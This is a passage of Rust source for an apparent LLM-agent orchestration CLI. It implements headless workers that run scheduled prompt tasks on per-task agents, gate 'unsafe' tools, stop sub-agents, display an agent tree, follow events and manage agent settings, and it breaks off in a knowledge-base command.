/// Whether a task is for its worker itself, by name - the only kind it
/// runs as itself, and so one at a time.
fn task_is_for_worker(task: &db::TaskRow) -> bool {
    task.profile.is_none() && task.agent_name.is_some()
}

/// Runs one claimed prompt task headlessly, in a fresh conversation, and
/// records how it went. Returns that outcome. A task for `agent` by name
/// runs as `agent`; one bound to a profile on a new agent made from it,
/// and one for any agent on a new `task-<id>` agent - both under `agent`.
fn run_prompt_task_headless(
    task: &db::TaskRow,
    agent: &str,
    db: &Arc<dyn DbBackend>,
    session_id: &str,
    tools: &Arc<ToolsCollection>,
    opts: &Opts,
    extra: Arc<SubAgentContext>,
    mcp_manager: &Option<Arc<faber::mcp::McpManager>>,
    cancel: mpsc::Receiver<()>,
) -> db::TaskOutcome {
    let worker = agent;
    let worker_unsafe =
        session_agent_unsafe(opts, &db.get_agent_config(worker).unwrap_or_default());
    // A task a safe agent made runs without the unsafe tools, even on an
    // agent made for it when the worker has them.
    let task_unsafe = worker_unsafe && !task.run_safe;
    let task_agent = match &task.profile {
        Some(profile) => Some(profile_task_agent(
            task,
            profile,
            worker,
            task_unsafe,
            db.as_ref(),
            session_id,
            &session_profiles(opts, Some(db.as_ref())),
        )),
        None if task_is_for_worker(task) && task_unsafe == worker_unsafe => None,
        None => Some(own_task_agent(
            task,
            worker,
            task_unsafe,
            db.as_ref(),
            session_id,
        )),
    };
    let agent = match &task_agent {
        None => worker,
        Some(Ok(name)) => name.as_str(),
        Some(Err(e)) => {
            let outcome = db::TaskOutcome {
                succeeded: false,
                exit_code: None,
                result: format!("Couldn't make its agent: {}", e),
            };
            record_turn_end(
                &Some(EventLog::new(db.clone(), worker, Some(task.id))),
                &outcome,
            );
            if let Err(e) = db.finish_task(task.id, session_id, &outcome) {
                warn!("Couldn't record the outcome of task {}: {}", task.id, e);
            }
            return outcome;
        }
    };
    let agent_config = db.get_agent_config(agent).unwrap_or_default();
    // Stopping the agent stops this (see `handle_agent_stops`).
    let _ = db.set_agent_data(agent, db::RUNNING_TASK_KEY, &task.id.to_string());
    struct NotRunningWhenDone<'a>(&'a dyn DbBackend, &'a str);
    impl Drop for NotRunningWhenDone<'_> {
        fn drop(&mut self) {
            let _ = self.0.delete_agent_data(self.1, db::RUNNING_TASK_KEY);
        }
    }
    let _not_running = NotRunningWhenDone(db.as_ref(), agent);
    // The task's own directory, else its agent's.
    let run_cwd = task.cwd.clone().or(agent_config.cwd.clone());
    if let Some(cwd) = run_cwd
        .as_deref()
        .filter(|c| !std::path::Path::new(c).is_dir())
    {
        let outcome = db::TaskOutcome {
            succeeded: false,
            exit_code: None,
            result: format!(
                "'{}' works in {}, which isn't a directory on this machine",
                agent, cwd
            ),
        };
        record_turn_end(
            &Some(EventLog::new(db.clone(), agent, Some(task.id))),
            &outcome,
        );
        if let Err(e) = db.finish_task(task.id, session_id, &outcome) {
            warn!("Couldn't record the outcome of task {}: {}", task.id, e);
        }
        if agent != worker {
            let _ = db.release_agent(agent, session_id);
        }
        return outcome;
    }
    let openai_opts = build_openai_opts(opts, &agent_config);
    let tools = &agent_tools(tools, task_unsafe, &agent_config);
    // Its sub-agents start from its settings and tools, not the worker's.
    let extra = Arc::new(SubAgentContext {
        opts: openai_opts.clone(),
        tools: Arc::new(tools.clone()),
        profiles: Arc::new(session_profiles(opts, Some(db.as_ref()))),
        ..(*extra).clone()
    });
    // Run as the agent itself - a task for it by name, a message to it -
    // it carries on its conversation, as a chat does; on an agent made
    // for it, it starts one.
    let saved: Vec<Message> = if task_agent.is_none() {
        db.load_agent_messages(agent)
            .unwrap_or_default()
            .into_iter()
            .filter_map(|v| serde_json::from_value(v).ok())
            .collect()
    } else {
        Vec::new()
    };
    let here = run_cwd
        .as_deref()
        .map(PathBuf::from)
        .unwrap_or_else(|| std::env::current_dir().unwrap_or_default());
    let mut messages = if saved.is_empty() {
        let mut messages = initialize_agent_messages(tools, opts, &agent_config);
        messages.push(working_directory_note(&here));
        messages
    } else {
        let budget = agent_config
            .context_window
            .or(opts.context_window)
            .map_or(DEFAULT_HISTORY_CHARS, |window| window as usize * 2);
        let mut messages = fit_history(saved, budget);
        if task.cwd.is_some() {
            messages.push(working_directory_note(&here));
        }
        messages
    };
    messages.push(running_task_note(task.id));
    let input = format!(
        "[Scheduled task #{} \"{}\"]: {}",
        task.id, task.name, task.command
    );
    let events = Some(EventLog::new(db.clone(), agent, Some(task.id)));
    if let Some(events) = &events {
        events.emit(AgentEvent::Input {
            text: input.clone(),
        });
    }
    messages.push(make_message("user", input));
    let mut ctx = ToolContext::new(|_: &str| {});
    ctx.db = Some(db.clone());
    ctx.unsafe_tools = task_unsafe;
    ctx.task_id = Some(task.id);
    ctx.cwd = run_cwd.map(PathBuf::from);
    ctx.agent_name = Some(agent.to_string());
    // The worker's own agent, or one made for the task.
    ctx.mcp = if agent == worker {
        session_mcp(mcp_manager, &agent_config, opts)
    } else {
        agent_mcp(mcp_manager.as_ref(), &agent_config)
    };
    ctx.context_window = agent_config.context_window.or(opts.context_window);
    let runs = extra.runs.clone();
    let running = extra.running_subagents.clone();
    ctx.extra = Some(extra);
    let slot = Arc::new(Mutex::new(None));
    ctx.result_slot = Some(slot.clone());
    let activity = ActivityRecorder::new(db.clone(), agent);
    let mode = || {
        let activity = activity.clone();
        recorded_mode(
            ResponseMode::Streaming {
                stream_handler: Box::new(|_: &str| Ok(())),
                reasoning_handler: Box::new(|_: &str| Ok(())),
                progress_handler: Box::new(move |progress: &ProgressInfo| {
                    activity.follow(&progress.status);
                    Ok(())
                }),
            },
            &events,
        )
    };
    let cancel = Some(Arc::new(Mutex::new(cancel)));
    // Long-running tools (fan_out, agent_wait) notice a stop too.
    ctx.interrupt = cancel.clone();
    let result = run_collecting_sub_agents(&runs, agent, &cancel, &events, messages, |messages| {
        post_request_with_mode(messages, tools, &openai_opts, mode(), &ctx, cancel.clone())
    });
    let interrupted = matches!(&result, Err(e) if e.downcast_ref::<InterruptedError>().is_some());
    if interrupted {
        // Its sub-agents, and theirs, go with it.
        let names: Vec<String> = running
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .keys()
            .cloned()
            .collect();
        for name in names {
            if db
                .agent_lineage(&name)
                .is_ok_and(|lineage| lineage.iter().skip(1).any(|a| a == agent))
            {
                stop_sub_agent(&running, &name, "its task was stopped");
            }
        }
    }
    if let Ok(response) = &result {
        let values: Vec<serde_json::Value> = response
            .history
            .iter()
            .filter_map(|m| serde_json::to_value(m).ok())
            .collect();
        let _ = db.save_agent_messages(agent, &values);
    }
    let mut outcome = reported_task_outcome(result.as_ref(), &slot);
    if interrupted {
        let asked = db
            .get_task(task.id)
            .ok()
            .flatten()
            .is_some_and(|t| t.stop_requested);
        outcome.result = if asked {
            "stopped".to_string()
        } else {
            "stopped: the worker was interrupted".to_string()
        };
    }
    record_turn_end(&events, &outcome);
    if let Err(e) = db.finish_task(task.id, session_id, &outcome) {
        warn!("Couldn't record the outcome of task {}: {}", task.id, e);
    }
    if agent != worker {
        // The worker's own activity is the worker loop's to keep.
        let first = first_line(&outcome.result, 80);
        activity.set(&if outcome.succeeded {
            format!("finished: {}", first)
        } else {
            format!("failed: {}", first)
        });
        let _ = db.release_agent(agent, session_id);
    }
    outcome
}

/// Stops headless workers - they pick up no more tasks - and interrupts
/// the tasks they're running: what Ctrl-C does.
#[derive(Clone, Default)]
struct WorkerStop {
    stopping: Arc<AtomicBool>,
    /// Interrupts each running task, by id.
    cancels: Arc<Mutex<HashMap<i64, mpsc::Sender<()>>>>,
}

impl WorkerStop {
    fn stop(&self) {
        self.stopping.store(true, Ordering::Relaxed);
        for cancel in self
            .cancels
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .values()
        {
            let _ = cancel.send(());
        }
    }

    fn stopped(&self) -> bool {
        self.stopping.load(Ordering::Relaxed)
    }
}

/// A headless worker to run (`run_worker`).
struct WorkerSpec {
    agent: String,
    /// The most prompt tasks it works on at once, if limited: each runs on
    /// its own agent (but those for it by name, one at a time), so there's
    /// no need to - the model's capacity is `--max-parallel-requests`'.
    parallel: Option<usize>,
    /// The profiles whose tasks it takes on; `None`: all it has, the
    /// database's included - read again as they change.
    profiles: Option<Vec<String>>,
    /// If another session has the agent, wait for it to be free instead
    /// of failing.
    wait_for_agent: bool,
    /// Also run tool tasks: one scheduler per process is enough.
    tool_tasks: bool,
    /// Start each line it logs with the agent's name, as several log
    /// together.
    label: bool,
}

/// The profiles a worker takes on: `only` (checked to exist), or - with
/// none given - all it has, as they are when it looks (`None`).
fn worker_profiles(opts: &Opts, only: &[String]) -> Result<Option<Vec<String>>, Box<dyn Error>> {
    if only.is_empty() {
        return Ok(None);
    }
    for name in only {
        find_profile(&opts.profiles, name)?;
    }
    let mut profiles = only.to_vec();
    profiles.sort();
    Ok(Some(profiles))
}

/// `faber worker`: works through scheduled tasks as `agent`, headlessly,
/// up to `parallel` prompt tasks at once, until Ctrl-C.
fn worker_command(
    opts: &Opts,
    db: Option<Arc<dyn DbBackend>>,
    mcp_manager: Option<Arc<faber::mcp::McpManager>>,
    agent: Option<String>,
    parallel: Option<usize>,
    only_profiles: &[String],
) -> Result<(), Box<dyn Error>> {
    let db = db.ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let opts = &with_db_profiles(opts, &Some(db.clone()));
    let spec = WorkerSpec {
        agent: agent.unwrap_or_else(|| format!("worker-{}", std::process::id())),
        parallel,
        profiles: worker_profiles(opts, only_profiles)?,
        wait_for_agent: false,
        tool_tasks: true,
        label: false,
    };
    let stop = WorkerStop::default();
    {
        let stop = stop.clone();
        ctrlc::set_handler(move || stop.stop())?;
    }
    run_worker(opts, db, &mcp_manager, &spec, &stop)
}

/// Works through scheduled tasks as `spec.agent` until `stop`.
fn run_worker(
    opts: &Opts,
    db: Arc<dyn DbBackend>,
    mcp_manager: &Option<Arc<faber::mcp::McpManager>>,
    spec: &WorkerSpec,
    stop: &WorkerStop,
) -> Result<(), Box<dyn Error>> {
    let agent = spec.agent.clone();
    // The profiles whose tasks it takes on, as they are now.
    let current_profiles = || -> Vec<String> {
        spec.profiles.clone().unwrap_or_else(|| {
            let mut names: Vec<String> = session_profiles(opts, Some(db.as_ref()))
                .into_keys()
                .collect();
            names.sort();
            names
        })
    };
    let log = |line: String| {
        println!(
            "[{}] {}{}",
            chrono::Local::now().format("%H:%M:%S"),
            if spec.label {
                format!("{}: ", agent)
            } else {
                String::new()
            },
            line
        );
    };
    let session_id = format!(
        "{}-{}-{}",
        std::process::id(),
        agent,
        chrono::Utc::now().timestamp_millis()
    );
    if db.get_agent(&agent)?.is_none() {
        db.create_agent(&agent, "Headless worker")?;
    }
    let mut waiting = false;
    while !db.claim_agent(&agent, &session_id)? {
        if !spec.wait_for_agent {
            return Err(format!("agent '{}' is in use by another session", agent).into());
        }
        if !waiting {
            log(format!(
                "'{}' is in use by another session; waiting for it to be free",
                agent
            ));
            waiting = true;
        }
        for _ in 0..10 {
            if stop.stopped() {
                return Ok(());
            }
            std::thread::sleep(Duration::from_millis(500));
        }
    }
    if session_agent_unsafe(opts, &db.get_agent_config(&agent)?) {
        mark_session_unsafe(db.as_ref(), &agent, &session_id);
    }
    let parallel = spec.parallel.map(|p| p.max(1));
    // Each task's agent gets its own of these (see `agent_tools`).
    let tools = Arc::new(session_tools(opts));
    let cancels = &stop.cancels;
    {
        let db = db.clone();
        let session_id = session_id.clone();
        let stopping = stop.stopping.clone();
        std::thread::spawn(move || {
            let mut beat = 0u64;
            while !stopping.load(Ordering::Relaxed) {
                let _ = db.heartbeat_all(&session_id);
                beat += 1;
                if beat % 12 == 0 {
                    if let Err(e) = remove_one_job_agents_done(db.as_ref()) {
                        debug!("Couldn't remove finished agents: {}", e);
                    }
                }
                std::thread::sleep(Duration::from_secs(5));
            }
        });
    }
    // Tool tasks, as any chat session runs them; their results only get
    // logged here.
    let (task_tx, task_rx) = mpsc::channel::<(Option<String>, String, Message, Message)>();
    if spec.tool_tasks {
        let db = db.clone();
        let session_id = session_id.clone();
        let tools = Arc::new(ToolTaskTools::new(opts));
        std::thread::spawn(move || scheduler_loop(db, session_id, tools, task_tx));
    }

    let model = opts
        .model
        .clone()
        .unwrap_or_else(|| DEFAULT_MODEL.to_string());
    log(format!(
        "Working as '{}' ({}model {}{}); Ctrl-C to stop",
        agent,
        match parallel {
            Some(1) => "1 task at a time, ".to_string(),
            Some(n) => format!("up to {} tasks at once, ", n),
            None => String::new(),
        },
        model,
        match &spec.profiles {
            Some(only) => format!(", only profiles {}", only.join(", ")),
            None => match current_profiles() {
                all if all.is_empty() => String::new(),
                all => format!(", profiles {}", all.join(", ")),
            },
        }
    ));
    let extra = Arc::new(SubAgentContext {
        runs: Arc::new(SubAgentRuns::default()),
        tools: tools.clone(),
        opts: build_openai_opts(opts, &db.get_agent_config(&agent)?),
        session_id: session_id.clone(),
        active_subagents: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
        running_subagents: Arc::new(Mutex::new(HashMap::new())),
        status_bar: Arc::new(status_bar::StatusBar::new()),
        session_usage: Arc::new(Mutex::new(SessionUsage::default())),
        profiles: Arc::new(opts.profiles.clone()),
    });
    let activity = ActivityRecorder::new(db.clone(), &agent);
    activity.set("idle");
    let running = std::sync::atomic::AtomicUsize::new(0);
    // Running a task for it by name, as itself: that run keeps the
    // activity meanwhile.
    let own_busy = AtomicBool::new(false);
    let summarize = |running: usize| {
        if !own_busy.load(Ordering::Relaxed) {
            activity.force(&match running {
                0 => "idle".to_string(),
                1 => "running 1 task".to_string(),
                n => format!("running {} tasks", n),
            });
        }
    };
    // Task threads borrow from here, so they live in a scope that ends
    // only once every one of them has.
    std::thread::scope(|scope| {
        while !stop.stopped() {
            // Agents asked to stop: their tasks, or them as sub-agents.
            handle_agent_stops(db.as_ref(), &session_id, &extra.running_subagents, &|| {});
            // Tasks asked to stop (`faber tasks stop`, the web UI): signal
            // them until they do - one signal may be taken by a tool that
            // isn't the one waiting.
            let running_ids: Vec<i64> = cancels
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .keys()
                .copied()
                .collect();
            for id in running_ids {
                if db
                    .get_task(id)
                    .ok()
                    .flatten()
                    .is_some_and(|t| t.stop_requested)
                {
                    if let Some(cancel) = cancels.lock().unwrap_or_else(|e| e.into_inner()).get(&id)
                    {
                        let _ = cancel.send(());
                    }
                }
            }
            while let Ok((_, command, _, tool_msg)) = task_rx.try_recv() {
                log(format!(
                    "tool task ran: {} -> {}",
                    first_line(&command, 60),
                    first_line(tool_msg.content.as_deref().unwrap_or(""), 80)
                ));
            }
            if parallel.is_none_or(|p| running.load(Ordering::Relaxed) < p) {
                if let Some(task) = claim_prompt_task_but(
                    db.as_ref(),
                    &session_id,
                    &agent,
                    &current_profiles(),
                    own_busy.load(Ordering::Relaxed),
                    false,
                ) {
                    let own = task_is_for_worker(&task);
                    if own {
                        own_busy.store(true, Ordering::Relaxed);
                    }
                    let (cancel_tx, cancel_rx) = mpsc::channel();
                    cancels
                        .lock()
                        .unwrap_or_else(|e| e.into_inner())
                        .insert(task.id, cancel_tx);
                    summarize(running.fetch_add(1, Ordering::Relaxed) + 1);
                    log(match &task.profile {
                        Some(profile) => format!(
                            "#{} \"{}\" started on profile {}",
                            task.id, task.name, profile
                        ),
                        None => format!("#{} \"{}\" started", task.id, task.name),
                    });
                    let (db, session_id, tools, extra, mcp_manager, agent) =
                        (&db, &session_id, &tools, extra.clone(), mcp_manager, &agent);
                    let (running, cancels, own_busy, summarize) =
                        (&running, &cancels, &own_busy, &summarize);
                    scope.spawn(move || {
                        let started = std::time::Instant::now();
                        let outcome = run_prompt_task_headless(
                            &task,
                            agent,
                            db,
                            session_id,
                            tools,
                            opts,
                            extra,
                            mcp_manager,
                            cancel_rx,
                        );
                        cancels
                            .lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .remove(&task.id);
                        log(format!(
                            "#{} {} ({:.0}s): {}",
                            task.id,
                            if outcome.succeeded {
                                "done ✓"
                            } else {
                                "failed ✗"
                            },
                            started.elapsed().as_secs_f64(),
                            first_line(&outcome.result, 100)
                        ));
                        if own {
                            own_busy.store(false, Ordering::Relaxed);
                        }
                        summarize(running.fetch_sub(1, Ordering::Relaxed) - 1);
                    });
                    continue; // there may be more ready right away
                }
            }
            std::thread::sleep(Duration::from_millis(500));
        }
        log("Stopping...".to_string());
    });
    let _ = db.release_all_agents(&session_id);
    activity.set("stopped");
    Ok(())
}

/// The agents in tree order - each followed by the ones it spawned - with
/// the tree drawing to put before each name.
fn agent_tree(agents: &[db::AgentRow]) -> Vec<(String, &db::AgentRow)> {
    let names: std::collections::HashSet<&str> = agents.iter().map(|a| a.name.as_str()).collect();
    let mut children: HashMap<&str, Vec<&db::AgentRow>> = HashMap::new();
    let mut roots = Vec::new();
    for agent in agents {
        match agent.parent.as_deref().filter(|p| names.contains(p)) {
            Some(parent) => children.entry(parent).or_default().push(agent),
            None => roots.push(agent),
        }
    }
    fn walk<'a>(
        agent: &'a db::AgentRow,
        prefix: &str,
        branch: &str,
        children: &HashMap<&str, Vec<&'a db::AgentRow>>,
        out: &mut Vec<(String, &'a db::AgentRow)>,
        depth: usize,
    ) {
        out.push((format!("{}{}", prefix, branch), agent));
        if depth > 64 {
            return;
        }
        let kids = children
            .get(agent.name.as_str())
            .map(Vec::as_slice)
            .unwrap_or(&[]);
        let continuation = match branch {
            "├─ " => format!("{}│  ", prefix),
            "└─ " => format!("{}   ", prefix),
            _ => prefix.to_string(),
        };
        for (i, kid) in kids.iter().enumerate() {
            let branch = if i + 1 == kids.len() {
                "└─ "
            } else {
                "├─ "
            };
            walk(kid, &continuation, branch, children, out, depth + 1);
        }
    }
    let mut out = Vec::new();
    for root in roots {
        walk(root, "", "", &children, &mut out, 0);
    }
    out
}

fn print_agents_tree(
    db: &dyn DbBackend,
    now: chrono::DateTime<chrono::Utc>,
) -> Result<(), Box<dyn Error>> {
    let agents = db.list_agents()?;
    if agents.is_empty() {
        println!("No agents.");
        return Ok(());
    }
    let mut table = Table::new();
    table.set_format(*format::consts::FORMAT_NO_BORDER_LINE_SEPARATOR);
    table.set_titles(Row::new(
        ["Agent", "Session", "Activity", "Since", "Model"]
            .iter()
            .map(|t| Cell::new(t))
            .collect(),
    ));
    for (prefix, agent) in agent_tree(&agents) {
        let since = agent
            .activity_at
            .as_deref()
            .and_then(db::parse_db_time)
            .map(|t| format_relative(t, now))
            .unwrap_or_else(|| "-".to_string());
        let activity = agent.activity.as_deref().unwrap_or("-");
        let activity_cell = if activity.starts_with("stopped") || activity.starts_with("failed") {
            Cell::new(&first_line(activity, 60)).style_spec("Fr")
        } else if activity == "idle" || activity.starts_with("finished") || activity == "-" {
            Cell::new(&first_line(activity, 60))
        } else {
            Cell::new(&first_line(activity, 60)).style_spec("Fy")
        };
        let model = db
            .get_agent_config(&agent.name)?
            .model
            .unwrap_or_else(|| "-".to_string());
        let unsafe_mark = if db.get_agent_config(&agent.name)?.unsafe_tools == Some(true) {
            " (unsafe)"
        } else {
            ""
        };
        table.add_row(Row::new(vec![
            Cell::new(&format!("{}{}{}", prefix, agent.name, unsafe_mark)),
            Cell::new(if db::agent_session_is_live(agent, now) {
                "live"
            } else {
                "-"
            }),
            activity_cell,
            Cell::new(&since),
            Cell::new(&model),
        ]));
    }
    table.printstd();
    Ok(())
}

/// One message of a transcript, for `faber agents show`.
fn format_transcript_message(message: &Message, full: bool) -> String {
    let cut = |text: &str| {
        if full || text.chars().count() <= 400 {
            text.to_string()
        } else {
            format!("{}…", text.chars().take(400).collect::<String>())
        }
    };
    let mut out = format!("[{}]", message.role);
    if let Some(name) = &message.name {
        out.push_str(&format!(" {}", name));
    }
    if let Some(content) = message.content.as_deref().filter(|c| !c.trim().is_empty()) {
        out.push_str(&format!("\n{}", cut(content.trim())));
    }
    for call in message.tool_calls.iter().flatten() {
        out.push_str(&format!(
            "\n→ {}({})",
            call.function.name,
            cut(&call.function.arguments)
        ));
    }
    out
}

/// Prints one event, for `faber agents follow`. Streamed text continues
/// the line it's on; `last` is who printed what last, so a new agent's
/// text starts a new, labelled block.
fn print_event(
    row: &faber::agent_io::AgentEventRow,
    reasoning: bool,
    last: &mut Option<(String, &'static str)>,
) {
    let style = agent_style(&row.agent);
    let who = style.apply_to(&row.agent);
    let continues = |kind: &'static str, last: &Option<(String, &'static str)>| {
        last.as_ref()
            .is_some_and(|(agent, k)| agent == &row.agent && *k == kind)
    };
    let dim = Style::new().color256(244);
    match &row.event {
        AgentEvent::Text { text } | AgentEvent::Reasoning { text } => {
            let kind = if matches!(row.event, AgentEvent::Text { .. }) {
                "text"
            } else {
                "reasoning"
            };
            if kind == "reasoning" && !reasoning {
                return;
            }
            if !continues(kind, last) {
                // End another stream's line first.
                if last
                    .as_ref()
                    .is_some_and(|(_, k)| *k == "text" || *k == "reasoning")
                {
                    println!();
                }
                print!("{}: ", who);
            }
            if kind == "reasoning" {
                print!("{}", Style::new().color256(244).italic().apply_to(text));
            } else {
                print!("{}", text);
            }
            *last = Some((row.agent.clone(), kind));
            let _ = std::io::stdout().flush();
            return;
        }
        _ => {}
    }
    if last
        .as_ref()
        .is_some_and(|(_, k)| *k == "text" || *k == "reasoning")
    {
        println!();
    }
    *last = Some((row.agent.clone(), "line"));
    let task = row
        .task_id
        .map(|id| format!(" (task #{})", id))
        .unwrap_or_default();
    match &row.event {
        AgentEvent::Input { text } => {
            println!(
                "{}{} {} {}",
                who,
                task,
                dim.apply_to("<-"),
                first_line(text, 200)
            )
        }
        AgentEvent::ToolStart { name, arguments } => println!(
            "{} {}",
            who,
            dim.apply_to(format!("> {}({})", name, first_line(arguments, 120)))
        ),
        AgentEvent::ToolEnd {
            name,
            duration_ms,
            output,
            failed,
        } => {
            if *failed {
                println!(
                    "{} {}",
                    who,
                    Style::new().red().apply_to(format!(
                        "x {} failed: {}",
                        name,
                        first_line(&faber::agent_io::tool_error(output), 160)
                    ))
                );
            } else {
                println!(
                    "{} {}",
                    who,
                    dim.apply_to(format!(
                        "  {} done in {:.1}s: {}",
                        name,
                        *duration_ms as f64 / 1000.0,
                        first_line(output, 120)
                    ))
                );
            }
        }
        AgentEvent::TurnEnd { succeeded, text } => {
            let line = if *succeeded {
                Style::new().green().apply_to("finished".to_string())
            } else {
                Style::new()
                    .red()
                    .apply_to(format!("failed: {}", first_line(text, 160)))
            };
            println!("{}{} {}", who, task, line);
        }
        AgentEvent::Text { .. } | AgentEvent::Reasoning { .. } => {}
    }
}

/// `faber agents follow` / `faber tasks follow`: prints the latest events
/// of an agent, a task or every agent, then new ones as they're recorded,
/// until Ctrl-C. They're in the database, so this follows agents in any
/// process sharing it - other machines' too, through `faber serve`.
fn follow_events(
    db: &dyn DbBackend,
    agent: Option<String>,
    task: Option<i64>,
    reasoning: bool,
) -> Result<(), Box<dyn Error>> {
    if let Some(name) = &agent {
        db.get_agent(name)?
            .ok_or_else(|| format!("no agent named '{}'", name))?;
    }
    if let Some(id) = task {
        db.get_task(id)?.ok_or_else(|| format!("no task #{}", id))?;
    }
    let mut filter = faber::agent_io::EventFilter {
        agent,
        task_id: task,
        after: None,
        limit: 50,
    };
    let mut last = None;
    loop {
        let rows = db.agent_events(&filter)?;
        for row in &rows {
            print_event(row, reasoning, &mut last);
        }
        if let Some(row) = rows.last() {
            filter.after = Some(row.id);
        } else if filter.after.is_none() {
            filter.after = Some(0);
        }
        filter.limit = 500;
        std::thread::sleep(Duration::from_millis(500));
    }
}

/// `faber agents`: the agents as a tree, once or with `watch` every that
/// many seconds - or, with `show`, one agent and its transcript.
fn agents_command(
    opts: &Opts,
    db: &Option<Arc<dyn DbBackend>>,
    action: Option<&AgentsAction>,
    watch: Option<u64>,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    if let Some(AgentsAction::Message { name, text }) = action {
        db.get_agent(name)?
            .ok_or_else(|| format!("no agent named '{}'", name))?;
        let id = db.create_task(&db::message_task(name, text, chrono::Utc::now()))?;
        println!(
            "Sent to '{}' as task #{}: it gets it once it's free.",
            name, id
        );
        return Ok(());
    }
    if let Some(AgentsAction::Cleanup { dry_run }) = action {
        let names = db::finished_made_agents(&db.list_agents()?, chrono::Utc::now());
        if names.is_empty() {
            println!("No finished agents made by agents.");
        }
        for name in &names {
            if !*dry_run {
                db.delete_agent(name)?;
            }
            println!(
                "{} {}",
                if *dry_run { "Would remove" } else { "Removed" },
                name
            );
        }
        return Ok(());
    }
    if let Some(AgentsAction::Set {
        name,
        r#unsafe,
        safe,
        cwd,
        no_cwd,
        profile,
        settings,
    }) = action
    {
        if !*r#unsafe
            && !*safe
            && cwd.is_none()
            && !*no_cwd
            && profile.is_none()
            && settings.is_empty()
        {
            return Err("nothing to change: see `faber agents set --help`".into());
        }
        let here = std::env::current_dir()?;
        let cwd = cwd
            .as_deref()
            .map(|path| resolve_cwd(&here, path))
            .transpose()?;
        if db.get_agent(name)?.is_none() {
            db.create_agent(name, "")?;
        }
        if let Some(profile) = profile {
            let profiles = session_profiles(opts, Some(db.as_ref()));
            apply_profile(
                db.as_ref(),
                name,
                profile,
                find_profile(&profiles, profile)?,
            )?;
            println!("Agent '{}' has profile {}'s settings.", name, profile);
        }
        if !settings.is_empty() {
            let row = db.get_agent(name)?.ok_or("the agent went away")?;
            let config = db.get_agent_config(name)?;
            let changed = settings.apply(agent_settings(&config, &row.description))?;
            db.set_agent_config(name, &apply_settings(config, &changed))?;
            if settings.description.is_some() {
                db.set_agent_description(name, changed.description.as_deref().unwrap_or(""))?;
            }
            println!("Agent '{}': settings changed.", name);
        }
        if *r#unsafe || *safe {
            set_agent_unsafe(db.as_ref(), name, *r#unsafe)?;
            println!(
                "Agent '{}' {} the unsafe tools.",
                name,
                if *r#unsafe {
                    "now has"
                } else {
                    "no longer has"
                }
            );
        }
        if cwd.is_some() || *no_cwd {
            set_agent_cwd(db.as_ref(), name, cwd.clone())?;
            match cwd {
                Some(cwd) => println!("Agent '{}' works in {}.", name, cwd),
                None => println!("Agent '{}' works in the current directory again.", name),
            }
        }
        return Ok(());
    }
    if let Some(AgentsAction::Follow {
        name,
        task,
        reasoning,
    }) = action
    {
        return follow_events(db.as_ref(), name.clone(), *task, *reasoning);
    }
    if let Some(AgentsAction::Show { name, full }) = action {
        let agent = db
            .get_agent(name)?
            .ok_or_else(|| format!("no agent named '{}'", name))?;
        let now = chrono::Utc::now();
        let children: Vec<String> = db
            .list_agents()?
            .into_iter()
            .filter(|a| a.parent.as_deref() == Some(name.as_str()))
            .map(|a| a.name)
            .collect();
        let config = db.get_agent_config(name)?;
        println!("Agent {}", agent.name);
        println!("  Description:  {}", agent.description);
        println!("  Parent:       {}", agent.parent.as_deref().unwrap_or("-"));
        println!(
            "  Sub-agents:   {}",
            if children.is_empty() {
                "-".to_string()
            } else {
                children.join(", ")
            }
        );
        println!(
            "  Session:      {}",
            if db::agent_session_is_live(&agent, now) {
                "live"
            } else {
                "-"
            }
        );
        println!(
            "  Activity:     {}{}",
            agent.activity.as_deref().unwrap_or("-"),
            agent
                .activity_at
                .as_deref()
                .and_then(db::parse_db_time)
                .map(|t| format!(" ({})", format_relative(t, now)))
                .unwrap_or_default()
        );
        for (label, value) in agent_config_lines(&config) {
            println!("  {:<13} {}", format!("{}:", label), value);
        }
        let plan = load_plan(db.as_ref(), name).unwrap_or_default();
        if !plan.is_empty() {
            println!("\nPlan:");
            for line in format_plan(&plan) {
                println!("  {}", line);
            }
        }
        let messages: Vec<Message> = db
            .load_agent_messages(name)?
            .into_iter()
            .filter_map(|v| serde_json::from_value(v).ok())
            .collect();
        println!("\nConversation ({} messages):", messages.len());
        for message in &messages {
            println!("\n{}", format_transcript_message(message, *full));
        }
        return Ok(());
    }
    let Some(interval) = watch else {
        return print_agents_tree(db.as_ref(), chrono::Utc::now());
    };
    let interval = Duration::from_secs(interval.max(1));
    loop {
        let now = chrono::Utc::now();
        print!("\x1b[H\x1b[2J");
        println!(
            "Every {}s - {} (Ctrl-C to quit)\n",
            interval.as_secs(),
            now.with_timezone(&chrono::Local).format("%H:%M:%S")
        );
        if let Err(e) = print_agents_tree(db.as_ref(), now) {
            println!("Error: {}", e);
        }
        std::io::stdout().flush()?;
        std::thread::sleep(interval);
    }
}

/// `faber kb`: lists, searches, shows, adds or deletes knowledge base
/// notes, as the user - who sees every note, private ones included.
fn kb_command(
    db: &Option<Arc<dyn DbBackend>>,
    action: Option<&KbAction>,
    tag: Option<&str>,
    last: usize,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    // A database from before the knowledge base, opened read-only.
    match kb_command_inner(db.as_ref(), action, tag, last) {
        Err(e) if e.to_string().contains("no such table: kb_") => Err(
            "this database has no knowledge base yet: it's added the first time `faber chat` \
             or `faber kb add` opens it"
                .into(),
        ),
        other => other,
    }
}

fn kb_command_inner(
    db: &dyn DbBackend,
    action: Option<&KbAction>,
    tag: Option<&str>,
    last: usize,
) -> Result<(), Box<dyn Error>> {
    let viewer = db::KbViewer::User;
    let now = chrono::Utc::now();
    let updated = |note: &db::KbNote| {
        db::parse_db_time(&note.updated_at)
            .map(|t| format_relative(t, now))
            .unwrap_or_else(|| note.updated_at.clone())
    };
    let tag_list = |note: &db::KbNote| {
        if note.tags.is_empty() {
            String::new()
        } else {
            format!(" [{}]", note.tags.join(", "))
        }
    };
    match action {
        None => {
            let notes = db.kb_list(&viewer, tag, last)?;
            if notes.is_empty() {
                println!("No notes.");
                return Ok(());
            }
            let mut table = Table::new();
            table.set_format(*format::consts::FORMAT_NO_BORDER_LINE_SEPARATOR);
